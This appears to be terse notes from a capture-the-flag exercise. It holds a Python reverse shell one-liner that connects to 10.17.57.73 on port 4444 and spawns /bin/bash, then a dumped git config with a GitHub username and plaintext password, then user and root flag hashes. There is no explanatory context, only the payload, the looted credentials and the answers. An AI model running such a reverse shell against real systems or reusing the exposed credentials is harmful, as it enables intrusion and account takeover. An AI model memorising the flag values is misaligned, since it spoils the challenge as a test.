Reverse shell payload:
```
import socket,os,pty;s=socket.socket();s.connect(("10.17.57.73",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```




cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_


----
user.txt
996bdb1f619a68361417cabca5454705
----

---
root.txt
ba5ed03e9e74bb98054438480165e221
---
